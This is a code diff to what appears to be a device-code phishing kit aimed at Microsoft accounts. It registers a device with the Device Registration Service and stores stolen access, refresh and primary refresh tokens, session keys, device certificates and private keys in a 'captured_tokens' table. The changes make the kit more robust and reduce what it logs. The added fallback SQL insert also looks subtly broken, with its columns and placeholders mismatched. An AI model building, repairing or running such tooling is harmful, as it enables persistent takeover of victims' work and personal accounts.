@@ -60,8 +60,17 @@ function generateKeyPairAndCsr(commonName) {
   const csrPem = forge.pki.certificationRequestToPem(csr);
 
   // Convert CSR to DER and base64 for DRS
-  const csrDer = forge.asn1.toDer(forge.pki.certificationRequestToAsn1(csr)).getBytes();
-  const csrDerBase64 = Buffer.from(csrDer, 'binary').toString('base64');
+  let csrDerBase64 = null;
+  try {
+    const csrDer = forge.asn1.toDer(forge.pki.certificationRequestToAsn1(csr)).getBytes();
+    csrDerBase64 = Buffer.from(csrDer, 'binary').toString('base64');
+  } catch (csrErr) {
+    const pemBody = csrPem
+      .replace('-----BEGIN CERTIFICATE REQUEST-----', '')
+      .replace('-----END CERTIFICATE REQUEST-----', '')
+      .replace(/[\r\n\s]/g, '');
+    csrDerBase64 = pemBody || null;
+  }
 
   return {
     privateKeyPem,
@@ -134,6 +143,9 @@ async function enrollDevice(accessToken, deviceCodeId, tenant, proxy) {
     DeviceType: 'RegisteredDevice',
   };
 
+  // Avoid logging tenant values that may contain customer domains.
+  console.log('[devicecode] DRS enrollment starting');
+
   // Tie enrollment to the specific auth flow when available
   if (deviceCodeId) {
     enrollmentBody.DeviceCodeId = deviceCodeId;
@@ -165,6 +177,7 @@ async function enrollDevice(accessToken, deviceCodeId, tenant, proxy) {
   }
 
   const data = response.data;
+  console.log('[devicecode] DRS enrollment response received');
 
   // DRS may return the certificate in multiple fields
   let deviceCertificate =
@@ -420,35 +433,67 @@ async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy)
             }
         }
 
-        await db.query(
-            `INSERT INTO captured_tokens
-             (user_id, link_id, email, token_type, access_token_encrypted,
-              refresh_token_encrypted, id_token_encrypted,
-              prt, session_key_jwe, device_tenant_id,
-              ip_address, user_agent, expiration, tenant, template_type, client_id,
-              account_type,
-              device_id, device_certificate_encrypted, encrypted_private_key,
-              device_enrolled, enrollment_time)
-             VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR), ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
-            [
-                userId, linkId, email, 'token',
-                access_token ? encrypt(access_token) : null,
-                refresh_token ? encrypt(refresh_token) : null,
-                id_token ? encrypt(id_token) : null,
-                prt ? encrypt(prt) : null,
-                sessionKeyJwe ? encrypt(sessionKeyJwe) : null,
-                deviceTenantIdClaim,
-                '0.0.0.0',
-                'Device Code Flow',
-                tenant, 'office', clientIdUsed,
-                tenant === 'common' ? 'unknown' : 'work_school',
-                deviceId,
-                deviceCertificateEncrypted,
-                encryptedPrivateKey,
-                deviceEnrolled ? 1 : 0,
-                enrollmentTime,
-            ]
-        );
+        try {
+          await db.query(
+              `INSERT INTO captured_tokens
+               (user_id, link_id, email, token_type, access_token_encrypted,
+                refresh_token_encrypted, id_token_encrypted,
+                prt, session_key_jwe, device_tenant_id,
+                ip_address, user_agent, expiration, tenant, template_type, client_id,
+                account_type,
+                device_id, device_certificate_encrypted, encrypted_private_key,
+                device_enrolled, enrollment_time)
+               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR), ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
+              [
+                  userId, linkId, email, 'token',
+                  access_token ? encrypt(access_token) : null,
+                  refresh_token ? encrypt(refresh_token) : null,
+                  id_token ? encrypt(id_token) : null,
+                  prt ? encrypt(prt) : null,
+                  sessionKeyJwe ? encrypt(sessionKeyJwe) : null,
+                  deviceTenantIdClaim,
+                  '0.0.0.0',
+                  'Device Code Flow',
+                  tenant, 'office', clientIdUsed,
+                  tenant === 'common' ? 'unknown' : 'work_school',
+                  deviceId,
+                  deviceCertificateEncrypted,
+                  encryptedPrivateKey,
+                  deviceEnrolled ? 1 : 0,
+                  enrollmentTime,
+              ]
+          );
+        } catch (insertErr) {
+          const msg = insertErr?.message || '';
+          if (/Unknown column 'device_id'/.test(msg) || /Unknown column 'device_certificate_encrypted'/.test(msg) || /Unknown column 'encrypted_private_key'/.test(msg) || /Unknown column 'device_enrolled'/.test(msg) || /Unknown column 'enrollment_time'/.test(msg) || /Unknown column 'session_key_jwe'/.test(msg) || /Unknown column 'device_tenant_id'/.test(msg) || /Unknown column 'client_info'/.test(msg)) {
+            console.warn('[devicecode] Device columns missing, falling back to legacy insert');
+            await db.query(
+                `INSERT INTO captured_tokens
+                 (user_id, link_id, email, token_type, access_token_encrypted,
+                  refresh_token_encrypted, id_token_encrypted,
+                  prt, client_info, session_key_jwe, device_tenant_id,
+                  ip_address, user_agent, expiration, tenant, template_type, account_type, client_id)
+                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR), ?, ?, ?, ?)`,
+                [
+                    userId, linkId, email, 'token',
+                    access_token ? encrypt(access_token) : null,
+                    refresh_token ? encrypt(refresh_token) : null,
+                    id_token ? encrypt(id_token) : null,
+                    prt ? encrypt(prt) : null,
+                    null,
+                    sessionKeyJwe ? encrypt(sessionKeyJwe) : null,
+                    deviceTenantIdClaim,
+                    '0.0.0.0',
+                    'Device Code Flow',
+                    tenant, 'office',
+                    tenant === 'common' ? 'unknown' : 'work_school',
+                    clientIdUsed,
+                ]
+            );
+          } else {
+            throw insertErr;
+          }
+        }
 
         return {
             success: true,
